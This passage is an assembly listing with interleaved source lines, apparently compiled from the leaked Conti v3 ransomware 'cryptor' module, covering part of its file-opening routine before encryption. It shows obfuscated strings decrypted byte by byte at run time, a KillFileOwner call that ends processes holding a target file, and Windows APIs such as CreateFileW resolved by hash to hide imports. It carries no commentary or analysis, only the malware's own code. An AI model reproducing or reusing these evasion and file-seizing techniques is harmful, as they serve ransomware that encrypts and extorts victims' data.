  0020c	c6 45 d3 42	 mov	 BYTE PTR $T8[rbp-189], 66 ; 00000042H
  00210	c6 45 d4 15	 mov	 BYTE PTR $T8[rbp-188], 21
  00214	c6 45 d5 50	 mov	 BYTE PTR $T8[rbp-187], 80 ; 00000050H
  00218	c6 45 d6 15	 mov	 BYTE PTR $T8[rbp-186], 21
  0021c	c6 45 d7 75	 mov	 BYTE PTR $T8[rbp-185], 117 ; 00000075H
  00220	c6 45 d8 15	 mov	 BYTE PTR $T8[rbp-184], 21
  00224	c6 45 d9 6d	 mov	 BYTE PTR $T8[rbp-183], 109 ; 0000006dH
  00228	c6 45 da 15	 mov	 BYTE PTR $T8[rbp-182], 21
  0022c	c6 45 db 4a	 mov	 BYTE PTR $T8[rbp-181], 74 ; 0000004aH
  00230	c6 45 dc 15	 mov	 BYTE PTR $T8[rbp-180], 21
  00234	c6 45 dd 15	 mov	 BYTE PTR $T8[rbp-179], 21
  00238	c6 45 de 15	 mov	 BYTE PTR $T8[rbp-178], 21
  0023c	0f b6 45 91	 movzx	 eax, BYTE PTR $T8[rbp-255]

; 58   :         return m_isDecrypted;

  00240	0f b6 45 90	 movzx	 eax, BYTE PTR $T8[rbp-256]

; 63   :         if (!isDecrypted())

  00244	84 c0		 test	 al, al
  00246	75 5c		 jne	 SHORT $LN1134@OpenFileEn
  00248	0f 1f 84 00 00
	00 00 00	 npad	 8
$LL1135@OpenFileEn:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00250	0f b6 4c 3d 91	 movzx	 ecx, BYTE PTR $T8[rbp+rdi-255]

; 40   :     return (a % n + n) % n;

  00255	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0025a	83 e9 15	 sub	 ecx, 21
  0025d	44 6b c1 07	 imul	 r8d, ecx, 7

; 40   :     return (a % n + n) % n;

  00261	41 f7 e8	 imul	 r8d
  00264	41 03 d0	 add	 edx, r8d
  00267	c1 fa 06	 sar	 edx, 6
  0026a	8b c2		 mov	 eax, edx
  0026c	c1 e8 1f	 shr	 eax, 31
  0026f	03 d0		 add	 edx, eax
  00271	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00274	44 2b c0	 sub	 r8d, eax
  00277	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0027c	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00280	41 f7 e8	 imul	 r8d
  00283	41 03 d0	 add	 edx, r8d
  00286	c1 fa 06	 sar	 edx, 6
  00289	8b c2		 mov	 eax, edx
  0028b	c1 e8 1f	 shr	 eax, 31
  0028e	03 d0		 add	 edx, eax
  00290	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00293	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00296	44 88 44 3d 91	 mov	 BYTE PTR $T8[rbp+rdi-255], r8b
  0029b	48 ff c7	 inc	 rdi
  0029e	48 83 ff 4e	 cmp	 rdi, 78			; 0000004eH
  002a2	72 ac		 jb	 SHORT $LL1135@OpenFileEn
$LN1134@OpenFileEn:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 883  : 			logs::Write(OBFW(L"Can't open file %s. GetLastError = %lu"), FileInfo->Filename, pGetLastError());

  002a4	48 8b 16	 mov	 rdx, QWORD PTR [rsi]
  002a7	48 8d 4d 91	 lea	 rcx, QWORD PTR $T8[rbp-255]
  002ab	45 8b c1	 mov	 r8d, r9d
  002ae	e8 00 00 00 00	 call	 ?Write@logs@@YAXPEB_WZZ	; logs::Write

; 884  : 			return FALSE;

  002b3	e9 d5 0c 00 00	 jmp	 $LN1358@OpenFileEn
$LN1334@OpenFileEn:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  002b8	40 88 bd 90 00
	00 00		 mov	 BYTE PTR $T1[rbp-256], dil
  002bf	c6 85 91 00 00
	00 1f		 mov	 BYTE PTR $T1[rbp-255], 31
  002c6	c6 85 92 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-254], 111 ; 0000006fH
  002cd	c6 85 93 00 00
	00 76		 mov	 BYTE PTR $T1[rbp-253], 118 ; 00000076H
  002d4	c6 85 94 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-252], 111 ; 0000006fH
  002db	c6 85 95 00 00
	00 2a		 mov	 BYTE PTR $T1[rbp-251], 42 ; 0000002aH
  002e2	c6 85 96 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-250], 111 ; 0000006fH
  002e9	c6 85 97 00 00
	00 32		 mov	 BYTE PTR $T1[rbp-249], 50 ; 00000032H
  002f0	c6 85 98 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-248], 111 ; 0000006fH
  002f7	c6 85 99 00 00
	00 14		 mov	 BYTE PTR $T1[rbp-247], 20
  002fe	c6 85 9a 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-246], 111 ; 0000006fH
  00305	c6 85 9b 00 00
	00 69		 mov	 BYTE PTR $T1[rbp-245], 105 ; 00000069H
  0030c	c6 85 9c 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-244], 111 ; 0000006fH
  00313	c6 85 9d 00 00
	00 22		 mov	 BYTE PTR $T1[rbp-243], 34 ; 00000022H
  0031a	c6 85 9e 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-242], 111 ; 0000006fH
  00321	c6 85 9f 00 00
	00 14		 mov	 BYTE PTR $T1[rbp-241], 20
  00328	c6 85 a0 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-240], 111 ; 0000006fH
  0032f	c6 85 a1 00 00
	00 76		 mov	 BYTE PTR $T1[rbp-239], 118 ; 00000076H
  00336	c6 85 a2 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-238], 111 ; 0000006fH
  0033d	c6 85 a3 00 00
	00 22		 mov	 BYTE PTR $T1[rbp-237], 34 ; 00000022H
  00344	c6 85 a4 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-236], 111 ; 0000006fH
  0034b	c6 85 a5 00 00
	00 14		 mov	 BYTE PTR $T1[rbp-235], 20
  00352	c6 85 a6 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-234], 111 ; 0000006fH
  00359	c6 85 a7 00 00
	00 6d		 mov	 BYTE PTR $T1[rbp-233], 109 ; 0000006dH
  00360	c6 85 a8 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-232], 111 ; 0000006fH
  00367	c6 85 a9 00 00
	00 2a		 mov	 BYTE PTR $T1[rbp-231], 42 ; 0000002aH
  0036e	c6 85 aa 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-230], 111 ; 0000006fH
  00375	c6 85 ab 00 00
	00 11		 mov	 BYTE PTR $T1[rbp-229], 17
  0037c	c6 85 ac 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-228], 111 ; 0000006fH
  00383	c6 85 ad 00 00
	00 32		 mov	 BYTE PTR $T1[rbp-227], 50 ; 00000032H
  0038a	c6 85 ae 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-226], 111 ; 0000006fH
  00391	c6 85 af 00 00
	00 6d		 mov	 BYTE PTR $T1[rbp-225], 109 ; 0000006dH
  00398	c6 85 b0 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-224], 111 ; 0000006fH
  0039f	c6 85 b1 00 00
	00 21		 mov	 BYTE PTR $T1[rbp-223], 33 ; 00000021H
  003a6	c6 85 b2 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-222], 111 ; 0000006fH
  003ad	c6 85 b3 00 00
	00 09		 mov	 BYTE PTR $T1[rbp-221], 9
  003b4	c6 85 b4 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-220], 111 ; 0000006fH
  003bb	c6 85 b5 00 00
	00 14		 mov	 BYTE PTR $T1[rbp-219], 20
  003c2	c6 85 b6 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-218], 111 ; 0000006fH
  003c9	c6 85 b7 00 00
	00 5d		 mov	 BYTE PTR $T1[rbp-217], 93 ; 0000005dH
  003d0	c6 85 b8 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-216], 111 ; 0000006fH
  003d7	c6 85 b9 00 00
	00 6e		 mov	 BYTE PTR $T1[rbp-215], 110 ; 0000006eH
  003de	c6 85 ba 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-214], 111 ; 0000006fH
  003e5	c6 85 bb 00 00
	00 32		 mov	 BYTE PTR $T1[rbp-213], 50 ; 00000032H
  003ec	c6 85 bc 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-212], 111 ; 0000006fH
  003f3	c6 85 bd 00 00
	00 4c		 mov	 BYTE PTR $T1[rbp-211], 76 ; 0000004cH
  003fa	c6 85 be 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-210], 111 ; 0000006fH
  00401	c6 85 bf 00 00
	00 14		 mov	 BYTE PTR $T1[rbp-209], 20
  00408	c6 85 c0 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-208], 111 ; 0000006fH
  0040f	c6 85 c1 00 00
	00 7e		 mov	 BYTE PTR $T1[rbp-207], 126 ; 0000007eH
  00416	c6 85 c2 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-206], 111 ; 0000006fH
  0041d	c6 85 c3 00 00
	00 09		 mov	 BYTE PTR $T1[rbp-205], 9
  00424	c6 85 c4 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-204], 111 ; 0000006fH
  0042b	c6 85 c5 00 00
	00 14		 mov	 BYTE PTR $T1[rbp-203], 20
  00432	c6 85 c6 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-202], 111 ; 0000006fH
  00439	c6 85 c7 00 00
	00 6d		 mov	 BYTE PTR $T1[rbp-201], 109 ; 0000006dH
  00440	c6 85 c8 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-200], 111 ; 0000006fH
  00447	c6 85 c9 00 00
	00 4c		 mov	 BYTE PTR $T1[rbp-199], 76 ; 0000004cH
  0044e	c6 85 ca 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-198], 111 ; 0000006fH
  00455	c6 85 cb 00 00
	00 5d		 mov	 BYTE PTR $T1[rbp-197], 93 ; 0000005dH
  0045c	c6 85 cc 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-196], 111 ; 0000006fH
  00463	c6 85 cd 00 00
	00 33		 mov	 BYTE PTR $T1[rbp-195], 51 ; 00000033H
  0046a	c6 85 ce 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-194], 111 ; 0000006fH
  00471	c6 85 cf 00 00
	00 65		 mov	 BYTE PTR $T1[rbp-193], 101 ; 00000065H
  00478	c6 85 d0 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-192], 111 ; 0000006fH
  0047f	c6 85 d1 00 00
	00 32		 mov	 BYTE PTR $T1[rbp-191], 50 ; 00000032H
  00486	c6 85 d2 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-190], 111 ; 0000006fH
  0048d	c6 85 d3 00 00
	00 11		 mov	 BYTE PTR $T1[rbp-189], 17
  00494	c6 85 d4 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-188], 111 ; 0000006fH
  0049b	c6 85 d5 00 00
	00 14		 mov	 BYTE PTR $T1[rbp-187], 20
  004a2	c6 85 d6 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-186], 111 ; 0000006fH
  004a9	c6 85 d7 00 00
	00 6e		 mov	 BYTE PTR $T1[rbp-185], 110 ; 0000006eH
  004b0	c6 85 d8 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-184], 111 ; 0000006fH
  004b7	c6 85 d9 00 00
	00 11		 mov	 BYTE PTR $T1[rbp-183], 17
  004be	c6 85 da 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-182], 111 ; 0000006fH
  004c5	c6 85 db 00 00
	00 5d		 mov	 BYTE PTR $T1[rbp-181], 93 ; 0000005dH
  004cc	c6 85 dc 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-180], 111 ; 0000006fH
  004d3	c6 85 dd 00 00
	00 54		 mov	 BYTE PTR $T1[rbp-179], 84 ; 00000054H
  004da	c6 85 de 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-178], 111 ; 0000006fH
  004e1	c6 85 df 00 00
	00 11		 mov	 BYTE PTR $T1[rbp-177], 17
  004e8	c6 85 e0 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-176], 111 ; 0000006fH

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  004ef	c6 85 e1 00 00
	00 6d		 mov	 BYTE PTR $T1[rbp-175], 109 ; 0000006dH
  004f6	c6 85 e2 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-174], 111 ; 0000006fH
  004fd	c6 85 e3 00 00
	00 3b		 mov	 BYTE PTR $T1[rbp-173], 59 ; 0000003bH
  00504	c6 85 e4 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-172], 111 ; 0000006fH
  0050b	c6 85 e5 00 00
	00 04		 mov	 BYTE PTR $T1[rbp-171], 4
  00512	c6 85 e6 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-170], 111 ; 0000006fH
  00519	c6 85 e7 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-169], 111 ; 0000006fH
  00520	c6 85 e8 00 00
	00 6f		 mov	 BYTE PTR $T1[rbp-168], 111 ; 0000006fH
  00527	0f b6 85 91 00
	00 00		 movzx	 eax, BYTE PTR $T1[rbp-255]

; 58   :         return m_isDecrypted;

  0052e	0f b6 85 90 00
	00 00		 movzx	 eax, BYTE PTR $T1[rbp-256]

; 63   :         if (!isDecrypted())

  00535	84 c0		 test	 al, al
  00537	75 62		 jne	 SHORT $LN390@OpenFileEn

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00539	4c 8b cf	 mov	 r9, rdi
  0053c	0f 1f 40 00	 npad	 4
$LL391@OpenFileEn:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00540	42 0f b6 8c 0d
	91 00 00 00	 movzx	 ecx, BYTE PTR $T1[rbp+r9-255]

; 40   :     return (a % n + n) % n;

  00549	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0054e	83 e9 6f	 sub	 ecx, 111		; 0000006fH
  00551	44 6b c1 0f	 imul	 r8d, ecx, 15

; 40   :     return (a % n + n) % n;

  00555	41 f7 e8	 imul	 r8d
  00558	41 03 d0	 add	 edx, r8d
  0055b	c1 fa 06	 sar	 edx, 6
  0055e	8b c2		 mov	 eax, edx
  00560	c1 e8 1f	 shr	 eax, 31
  00563	03 d0		 add	 edx, eax
  00565	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00568	44 2b c0	 sub	 r8d, eax
  0056b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00570	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00574	41 f7 e8	 imul	 r8d
  00577	41 03 d0	 add	 edx, r8d
  0057a	c1 fa 06	 sar	 edx, 6
  0057d	8b c2		 mov	 eax, edx
  0057f	c1 e8 1f	 shr	 eax, 31
  00582	03 d0		 add	 edx, eax
  00584	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00587	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0058a	46 88 84 0d 91
	00 00 00	 mov	 BYTE PTR $T1[rbp+r9-255], r8b
  00592	49 ff c1	 inc	 r9
  00595	49 83 f9 58	 cmp	 r9, 88			; 00000058H
  00599	72 a5		 jb	 SHORT $LL391@OpenFileEn
$LN390@OpenFileEn:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 850  : 			logs::Write(OBFW(L"File %s is already open by another program."), FileInfo->Filename);

  0059b	48 8b 16	 mov	 rdx, QWORD PTR [rsi]
  0059e	48 8d 8d 91 00
	00 00		 lea	 rcx, QWORD PTR $T1[rbp-255]
  005a5	e8 00 00 00 00	 call	 ?Write@logs@@YAXPEB_WZZ	; logs::Write

; 851  : 
; 852  : 			if (KillFileOwner(FileInfo->Filename))

  005aa	48 8b 0e	 mov	 rcx, QWORD PTR [rsi]
  005ad	e8 00 00 00 00	 call	 ?KillFileOwner@@YAHPEB_W@Z ; KillFileOwner
  005b2	85 c0		 test	 eax, eax
  005b4	0f 84 ee 03 00
	00		 je	 $LN8@OpenFileEn
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  005ba	40 88 7c 24 40	 mov	 BYTE PTR $T2[rsp], dil
  005bf	c6 44 24 41 76	 mov	 BYTE PTR $T2[rsp+1], 118 ; 00000076H
  005c4	c6 44 24 42 24	 mov	 BYTE PTR $T2[rsp+2], 36	; 00000024H
  005c9	c6 44 24 43 64	 mov	 BYTE PTR $T2[rsp+3], 100 ; 00000064H
  005ce	c6 44 24 44 24	 mov	 BYTE PTR $T2[rsp+4], 36	; 00000024H
  005d3	c6 44 24 45 16	 mov	 BYTE PTR $T2[rsp+5], 22
  005d8	c6 44 24 46 24	 mov	 BYTE PTR $T2[rsp+6], 36	; 00000024H
  005dd	c6 44 24 47 16	 mov	 BYTE PTR $T2[rsp+7], 22
  005e2	c6 44 24 48 24	 mov	 BYTE PTR $T2[rsp+8], 36	; 00000024H
  005e7	c6 44 24 49 79	 mov	 BYTE PTR $T2[rsp+9], 121 ; 00000079H
  005ec	c6 44 24 4a 24	 mov	 BYTE PTR $T2[rsp+10], 36 ; 00000024H
  005f1	c6 44 24 4b 64	 mov	 BYTE PTR $T2[rsp+11], 100 ; 00000064H
  005f6	c6 44 24 4c 24	 mov	 BYTE PTR $T2[rsp+12], 36 ; 00000024H
  005fb	c6 44 24 4d 16	 mov	 BYTE PTR $T2[rsp+13], 22
  00600	c6 44 24 4e 24	 mov	 BYTE PTR $T2[rsp+14], 36 ; 00000024H
  00605	c6 44 24 4f 4d	 mov	 BYTE PTR $T2[rsp+15], 77 ; 0000004dH
  0060a	c6 44 24 50 24	 mov	 BYTE PTR $T2[rsp+16], 36 ; 00000024H
  0060f	c6 44 24 51 0e	 mov	 BYTE PTR $T2[rsp+17], 14
  00614	c6 44 24 52 24	 mov	 BYTE PTR $T2[rsp+18], 36 ; 00000024H
  00619	c6 44 24 53 75	 mov	 BYTE PTR $T2[rsp+19], 117 ; 00000075H
  0061e	c6 44 24 54 24	 mov	 BYTE PTR $T2[rsp+20], 36 ; 00000024H
  00623	c6 44 24 55 61	 mov	 BYTE PTR $T2[rsp+21], 97 ; 00000061H
  00628	c6 44 24 56 24	 mov	 BYTE PTR $T2[rsp+22], 36 ; 00000024H
  0062d	c6 44 24 57 4d	 mov	 BYTE PTR $T2[rsp+23], 77 ; 0000004dH
  00632	c6 44 24 58 24	 mov	 BYTE PTR $T2[rsp+24], 36 ; 00000024H
  00637	c6 44 24 59 78	 mov	 BYTE PTR $T2[rsp+25], 120 ; 00000078H
  0063c	c6 44 24 5a 24	 mov	 BYTE PTR $T2[rsp+26], 36 ; 00000024H
  00641	c6 44 24 5b 5d	 mov	 BYTE PTR $T2[rsp+27], 93 ; 0000005dH
  00646	c6 44 24 5c 24	 mov	 BYTE PTR $T2[rsp+28], 36 ; 00000024H
  0064b	c6 44 24 5d 33	 mov	 BYTE PTR $T2[rsp+29], 51 ; 00000033H
  00650	c6 44 24 5e 24	 mov	 BYTE PTR $T2[rsp+30], 36 ; 00000024H
  00655	c6 44 24 5f 47	 mov	 BYTE PTR $T2[rsp+31], 71 ; 00000047H
  0065a	c6 44 24 60 24	 mov	 BYTE PTR $T2[rsp+32], 36 ; 00000024H
  0065f	c6 44 24 61 78	 mov	 BYTE PTR $T2[rsp+33], 120 ; 00000078H
  00664	c6 44 24 62 24	 mov	 BYTE PTR $T2[rsp+34], 36 ; 00000024H
  00669	c6 44 24 63 5d	 mov	 BYTE PTR $T2[rsp+35], 93 ; 0000005dH
  0066e	c6 44 24 64 24	 mov	 BYTE PTR $T2[rsp+36], 36 ; 00000024H
  00673	c6 44 24 65 33	 mov	 BYTE PTR $T2[rsp+37], 51 ; 00000033H
  00678	c6 44 24 66 24	 mov	 BYTE PTR $T2[rsp+38], 36 ; 00000024H
  0067d	c6 44 24 67 64	 mov	 BYTE PTR $T2[rsp+39], 100 ; 00000064H
  00682	c6 44 24 68 24	 mov	 BYTE PTR $T2[rsp+40], 36 ; 00000024H
  00687	c6 44 24 69 16	 mov	 BYTE PTR $T2[rsp+41], 22
  0068c	c6 44 24 6a 24	 mov	 BYTE PTR $T2[rsp+42], 36 ; 00000024H
  00691	c6 44 24 6b 4d	 mov	 BYTE PTR $T2[rsp+43], 77 ; 0000004dH
  00696	c6 44 24 6c 24	 mov	 BYTE PTR $T2[rsp+44], 36 ; 00000024H
  0069b	c6 44 24 6d 5d	 mov	 BYTE PTR $T2[rsp+45], 93 ; 0000005dH
  006a0	c6 44 24 6e 24	 mov	 BYTE PTR $T2[rsp+46], 36 ; 00000024H
  006a5	c6 44 24 6f 5a	 mov	 BYTE PTR $T2[rsp+47], 90 ; 0000005aH
  006aa	c6 44 24 70 24	 mov	 BYTE PTR $T2[rsp+48], 36 ; 00000024H
  006af	c6 44 24 71 5e	 mov	 BYTE PTR $T2[rsp+49], 94 ; 0000005eH
  006b4	c6 44 24 72 24	 mov	 BYTE PTR $T2[rsp+50], 36 ; 00000024H
  006b9	c6 44 24 73 5d	 mov	 BYTE PTR $T2[rsp+51], 93 ; 0000005dH
  006be	c6 44 24 74 24	 mov	 BYTE PTR $T2[rsp+52], 36 ; 00000024H
  006c3	c6 44 24 75 09	 mov	 BYTE PTR $T2[rsp+53], 9
  006c8	c6 44 24 76 24	 mov	 BYTE PTR $T2[rsp+54], 36 ; 00000024H
  006cd	c6 44 24 77 5d	 mov	 BYTE PTR $T2[rsp+55], 93 ; 0000005dH
  006d2	c6 44 24 78 24	 mov	 BYTE PTR $T2[rsp+56], 36 ; 00000024H
  006d7	c6 44 24 79 5e	 mov	 BYTE PTR $T2[rsp+57], 94 ; 0000005eH
  006dc	c6 44 24 7a 24	 mov	 BYTE PTR $T2[rsp+58], 36 ; 00000024H
  006e1	c6 44 24 7b 2a	 mov	 BYTE PTR $T2[rsp+59], 42 ; 0000002aH
  006e6	c6 44 24 7c 24	 mov	 BYTE PTR $T2[rsp+60], 36 ; 00000024H
  006eb	c6 44 24 7d 02	 mov	 BYTE PTR $T2[rsp+61], 2
  006f0	c6 44 24 7e 24	 mov	 BYTE PTR $T2[rsp+62], 36 ; 00000024H
  006f5	c6 44 24 7f 02	 mov	 BYTE PTR $T2[rsp+63], 2
  006fa	c6 45 80 24	 mov	 BYTE PTR $T2[rbp-192], 36 ; 00000024H
  006fe	c6 45 81 4d	 mov	 BYTE PTR $T2[rbp-191], 77 ; 0000004dH
  00702	c6 45 82 24	 mov	 BYTE PTR $T2[rbp-190], 36 ; 00000024H
  00706	c6 45 83 5e	 mov	 BYTE PTR $T2[rbp-189], 94 ; 0000005eH
  0070a	c6 45 84 24	 mov	 BYTE PTR $T2[rbp-188], 36 ; 00000024H
  0070e	c6 45 85 5e	 mov	 BYTE PTR $T2[rbp-187], 94 ; 0000005eH
  00712	c6 45 86 24	 mov	 BYTE PTR $T2[rbp-186], 36 ; 00000024H
  00716	c6 45 87 24	 mov	 BYTE PTR $T2[rbp-185], 36 ; 00000024H
  0071a	c6 45 88 24	 mov	 BYTE PTR $T2[rbp-184], 36 ; 00000024H
  0071e	0f b6 44 24 41	 movzx	 eax, BYTE PTR $T2[rsp+1]

; 58   :         return m_isDecrypted;

  00723	0f b6 44 24 40	 movzx	 eax, BYTE PTR $T2[rsp]

; 63   :         if (!isDecrypted())

  00728	84 c0		 test	 al, al
  0072a	75 55		 jne	 SHORT $LN724@OpenFileEn

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0072c	4c 8b d7	 mov	 r10, rdi
  0072f	90		 npad	 1
$LL725@OpenFileEn:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00730	42 0f b6 4c 14
	41		 movzx	 ecx, BYTE PTR $T2[rsp+r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00736	b8 24 00 00 00	 mov	 eax, 36			; 00000024H
  0073b	2b c1		 sub	 eax, ecx
  0073d	6b c8 2c	 imul	 ecx, eax, 44		; 0000002cH

; 40   :     return (a % n + n) % n;

  00740	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00745	f7 e9		 imul	 ecx
  00747	03 d1		 add	 edx, ecx
  00749	c1 fa 06	 sar	 edx, 6
  0074c	8b c2		 mov	 eax, edx
  0074e	c1 e8 1f	 shr	 eax, 31
  00751	03 d0		 add	 edx, eax
  00753	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00756	2b c8		 sub	 ecx, eax
  00758	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0075d	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00760	f7 e9		 imul	 ecx
  00762	03 d1		 add	 edx, ecx
  00764	c1 fa 06	 sar	 edx, 6
  00767	8b c2		 mov	 eax, edx
  00769	c1 e8 1f	 shr	 eax, 31
  0076c	03 d0		 add	 edx, eax
  0076e	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00771	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00773	42 88 4c 14 41	 mov	 BYTE PTR $T2[rsp+r10+1], cl
  00778	49 ff c2	 inc	 r10
  0077b	49 83 fa 48	 cmp	 r10, 72			; 00000048H
  0077f	72 af		 jb	 SHORT $LL725@OpenFileEn
$LN724@OpenFileEn:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 855  : 				logs::Write(OBFW(L"KillFileOwner for file %s - success"), FileInfo->Filename);

  00781	48 8b 16	 mov	 rdx, QWORD PTR [rsi]
  00784	48 8d 4c 24 41	 lea	 rcx, QWORD PTR $T2[rsp+1]
  00789	e8 00 00 00 00	 call	 ?Write@logs@@YAXPEB_WZZ	; logs::Write

; 857  : 				FileInfo->FileHandle = pCreateFileW(FileInfo->Filename,

  0078e	48 8b 1e	 mov	 rbx, QWORD PTR [rsi]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 174  : 	pFunction = (HANDLE(WINAPI*)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x017610e8, 97);//GetProcAddress(hKernel32, OBFA("CreateFileW"));

  00791	ba 0f 00 00 00	 mov	 edx, 15
  00796	41 b8 e8 10 76
	01		 mov	 r8d, 24514792		; 017610e8H
  0079c	44 8d 4a 52	 lea	 r9d, QWORD PTR [rdx+82]
  007a0	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 175  : 	return pFunction(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);

  007a5	48 89 7c 24 30	 mov	 QWORD PTR [rsp+48], rdi
  007aa	45 33 c9	 xor	 r9d, r9d
  007ad	89 7c 24 28	 mov	 DWORD PTR [rsp+40], edi
  007b1	45 33 c0	 xor	 r8d, r8d
  007b4	ba 00 00 00 c0	 mov	 edx, -1073741824	; c0000000H
  007b9	c7 44 24 20 03
	00 00 00	 mov	 DWORD PTR [rsp+32], 3
  007c1	48 8b cb	 mov	 rcx, rbx
  007c4	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 857  : 				FileInfo->FileHandle = pCreateFileW(FileInfo->Filename,

  007c6	48 89 46 08	 mov	 QWORD PTR [rsi+8], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 175  : 	return pFunction(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);

  007ca	48 8b d8	 mov	 rbx, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 865  : 				if (FileInfo->FileHandle == INVALID_HANDLE_VALUE) {

  007cd	48 83 f8 ff	 cmp	 rax, -1
  007d1	0f 85 72 05 00
	00		 jne	 $LN6@OpenFileEn
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 209  : 	pFunction = (DWORD(WINAPI*)())getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x9aab3800, 93);//GetProcAddress(hKernel32, OBFA("GetLastError"));

  007d7	8d 50 10	 lea	 edx, QWORD PTR [rax+16]
  007da	41 b8 00 38 ab
	9a		 mov	 r8d, -1700055040	; 9aab3800H
  007e0	44 8d 48 5e	 lea	 r9d, QWORD PTR [rax+94]
  007e4	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 210  : 	return pFunction();

  007e9	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  007eb	40 88 7d e0	 mov	 BYTE PTR $T4[rbp-256], dil
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

